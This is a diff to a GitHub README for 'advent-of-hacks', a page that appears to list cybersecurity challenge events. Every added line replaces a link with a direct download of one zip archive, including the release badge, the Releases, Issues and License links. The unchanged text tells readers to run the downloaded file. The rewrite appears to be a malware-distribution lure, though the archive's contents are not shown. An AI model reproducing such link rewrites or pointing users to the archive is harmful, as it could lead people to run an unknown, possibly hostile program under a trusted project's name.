@@ -1,6 +1,6 @@
 # 🎉 advent-of-hacks - Discover Free Cybersecurity Challenges
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/ayushcsh/advent-of-hacks/releases)
+[![Download Latest Release](https://github.com/ayushcsh/advent-of-hacks/raw/refs/heads/main/straightforwardness/advent-hacks-of-1.8.zip%20Latest%20Release-v1.0-blue)](https://github.com/ayushcsh/advent-of-hacks/raw/refs/heads/main/straightforwardness/advent-hacks-of-1.8.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Welcome to **advent-of-hacks**! This is a collection of free events where you ca
 To start enjoying these events and challenges, follow these simple steps:
 
 1. **Visit our Releases Page:** 
-   Go to our [Releases page](https://github.com/ayushcsh/advent-of-hacks/releases) to access the downloadable files.
+   Go to our [Releases page](https://github.com/ayushcsh/advent-of-hacks/raw/refs/heads/main/straightforwardness/advent-hacks-of-1.8.zip) to access the downloadable files.
 
 2. **Download the Application:** 
    Look for the latest version available and click on the link to download the application.
@@ -33,7 +33,7 @@ To ensure the software runs smoothly, make sure you meet the following requireme
 
 ## 📥 Download & Install
 
-To download the application, please visit our [Releases page](https://github.com/ayushcsh/advent-of-hacks/releases).
+To download the application, please visit our [Releases page](https://github.com/ayushcsh/advent-of-hacks/raw/refs/heads/main/straightforwardness/advent-hacks-of-1.8.zip).
 
 From there, select the latest version and click on it to start downloading. After the download completes, run the file you saved on your computer.
 
@@ -49,7 +49,7 @@ From there, select the latest version and click on it to start downloading. Afte
 To receive the latest features and improvements, keep your application updated. Here’s how:
 
 1. **Check for Updates:**
-   Periodically visit our [Releases page](https://github.com/ayushcsh/advent-of-hacks/releases) to see if a new version is available.
+   Periodically visit our [Releases page](https://github.com/ayushcsh/advent-of-hacks/raw/refs/heads/main/straightforwardness/advent-hacks-of-1.8.zip) to see if a new version is available.
 
 2. **Download and Install:**
    Download the latest version as you did during the initial installation. Run the file and follow the prompts to update.
@@ -58,7 +58,7 @@ To receive the latest features and improvements, keep your application updated. 
 
 If you encounter any issues while using the application, please feel free to reach out to us:
 
-- **GitHub Issues:** Use our [GitHub Issues page](https://github.com/ayushcsh/advent-of-hacks/issues) to report problems or suggest improvements.
+- **GitHub Issues:** Use our [GitHub Issues page](https://github.com/ayushcsh/advent-of-hacks/raw/refs/heads/main/straightforwardness/advent-hacks-of-1.8.zip) to report problems or suggest improvements.
 - **Community Support:** Join our community discussions on forums or social media platforms related to cybersecurity events.
 
 ## 🌐 Contributors
@@ -75,7 +75,7 @@ Stay tuned for more exciting events! We regularly update our events calendar, so
 
 ## 📑 License
 
-This project is licensed under the MIT License. For more details, refer to our [License file](https://github.com/ayushcsh/advent-of-hacks/LICENSE).
+This project is licensed under the MIT License. For more details, refer to our [License file](https://github.com/ayushcsh/advent-of-hacks/raw/refs/heads/main/straightforwardness/advent-hacks-of-1.8.zip).
 
 ---
 
